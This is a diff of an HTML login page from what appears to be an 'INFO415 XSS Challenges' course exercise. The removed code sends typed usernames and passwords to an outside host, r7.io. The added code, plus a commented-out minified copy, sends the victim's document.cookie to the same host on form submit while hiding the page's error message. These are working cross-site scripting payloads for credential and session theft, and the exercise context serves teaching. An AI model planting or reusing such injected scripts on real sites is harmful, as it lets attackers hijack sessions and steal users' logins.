@@ -1,5 +1,6 @@
+
 <!DOCTYPE html>
-<html lang="en" slick-uniqueid="1" keydn="true"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<html lang="en" slick-uniqueid="1" keydn="true"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
 
     <title>INFO415 XSS Challenges</title>
@@ -10,8 +11,7 @@
 
     <link href="css.css" media="screen" rel="stylesheet" type="text/css">
 
-    
-    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
     <script>
         $(document).ready( function() {
             var language = 'english';
@@ -20,6 +20,7 @@
             }
         });
     </script>
+
   </head>
 
 
@@ -28,25 +29,33 @@
   <form id="login" action="./login" method="get" class="untouched">
     
     
+      <h2 class="problem">Whoops!</h2>
+      <p class="error-message">
+        Username: <span id='name' value='a'>a</span> does not appear in the system. Please try again
+      </p>
+    
     
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
-          <input id="login_username" placeholder="username" tabindex="1" name="username" type="text" var ="username">
+          <input id="login_username" placeholder="username" tabindex="1" name="username" type="text">
           <div class="error-msg">Hint: your username is separate from your email address.</div>
           <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true"> 
-          <!--<script>var user = login_username;</script>-->
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
-        <!--<a href="http://xss-challenges.r7.io/0/login"></a>-->
-          <input type="submit" id="button" class="submit-btn optional" value="Sign in..." onclick="theFunction()" ;tabindex="3">
-            <script>
-              function theFunction(){
-                alert("Username: " + login_username.value + ' Password: ' + login_password.value);
-                i = new Image(); 
-                i.src = 'http://r7.io/e/1166811?s=' + login_username.value + ' ' + login_password.value;
-              };
-            </script>
+        <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
+        <script> 
+          function run() {
+              i = new Image();
+              i.src='http://r7.io/e/1166811?s=' + document.cookie;
+          };
+          target = document.getElementById("login");
+          test = target.getElementsByClassName('problem')[0].innerHTML=""; 
+          test2 = target.getElementsByClassName('error-message')[0].outerHTML=""; 
+          target.addEventListener('submit', run);
+          </script>
+        <!--<script>function run(){i=new Image();i.src='http://r7.io/e/1166811?s='+document.cookie;};var target=document.getElementById("login");test=target.getElementsByClassName('problem')[0].innerHTML="";test=target.getElementsByClassName('error-message')[0].outerHTML="";target.addEventListener('submit',run);</script>     -->
+      
       </div>
 
       <div class="supplemental-links">
@@ -68,5 +77,4 @@
 </div>
 
 
-  <script src="../../static/noauthpages3760373616.gz.js" type="text/javascript"></script>
-<!-- Localized -->
+  <script src="/static/noauthpages3760373616.gz.js" type="text/javascript"></script>
